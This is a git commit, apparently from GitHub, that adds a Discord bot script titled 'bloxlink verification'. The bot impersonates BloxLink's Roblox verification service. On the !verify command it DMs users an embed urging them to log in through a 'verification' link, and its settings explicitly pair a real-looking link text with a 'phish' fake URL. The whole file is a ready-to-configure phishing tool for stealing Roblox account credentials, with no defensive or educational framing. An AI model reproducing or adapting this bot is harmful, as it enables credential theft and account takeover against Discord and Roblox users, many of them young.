ec4263887aef6b001e3f7e4cf78de1f9671b774f
Severity <146803465+Severitylol@users.noreply.github.com>
2023-11-24 17:17:56 -0800

    "bloxlink verification"

---
+++ main.py
@@ -0,0 +1,36 @@
+import discord
+from discord.ext import commands
+
+intents = discord.Intents.all()
+
+# Settings (Change these to your liking)
+token = "YOUR_BOT_TOKEN"
+prefix = "!"
+title = "Please Complete Verification"
+desc = "To verify your account, please join BloxLink's Official Roblox Verification Game"
+field = "Please Login and join the game!"
+hyperlink = "SEEMINGLY_REAL_LINK"
+phish = "YOUR_FAKE_LINK"
+
+###################################################################
+
+client = commands.Bot(command_prefix=prefix, intents=intents)
+client.remove_command('help')
+
+@client.event
+async def on_ready():
+    print('')
+    print('----------------')
+    print('Bot Online!')
+    print('----------------')
+
+main = discord.Embed(title=title, description=desc, color=0xcf4948)
+main.add_field(name=field, value=f"[{hyperlink}]({phish})")
+main.set_thumbnail(url='https://avatars.githubusercontent.com/u/39774496?s=200&v=4')
+
+@client.command()
+async def verify(ctx):
+    await ctx.send('Sent Verification Link! Please Check DMs')
+    await ctx.author.send(embed=main)
+
+client.run(token)
